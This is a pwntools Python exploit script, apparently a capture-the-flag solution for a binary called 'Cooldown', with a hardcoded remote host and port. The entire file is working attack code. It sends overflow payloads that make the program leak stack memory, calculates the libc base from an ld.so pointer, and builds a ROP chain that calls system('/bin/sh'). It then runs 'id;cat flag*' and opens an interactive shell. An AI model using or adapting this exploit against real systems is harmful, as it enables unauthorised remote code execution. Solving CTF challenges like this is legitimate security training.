#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

exe = ELF('./Cooldown')
libc = ELF('./libc.so.6')

if args.REMOTE:
  host, port = "141.164.48.191", "10005"

if (args.REMOTE or args.DOCKER):
  p = remote(host,port)
else:
  p = process(exe.path)

# dumps ten times the stack, each time 8 bytes further on stack.. until we reach ld.so address on stack
count = 10
buff = ''

for i in range(count):
  payload = p64(0)*6+p64(0x601018)+p64(exe.sym['write'])+p64(0x40053e)
  p.sendafter('> ', payload)
  buff  = p.recv(0x60)
  print(hexdump(buff))

# get our ld.so leak & calculate libc base with it
ldso = u64(buff[0x48:0x50])
print('ldso leak = '+hex(ldso))
libc.address = ldso - 0x3f1000
print('libc base = '+hex(libc.address))

# do a simple system('/bin/sh')
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
bin_sh = next(libc.search('/bin/sh'))
payload = p64(0)*6+p64(0x601018)+p64(pop_rdi)+p64(bin_sh)+p64(libc.symbols['system'])
p.sendafter('> ', payload)

p.sendline('id;cat flag*')
p.interactive()

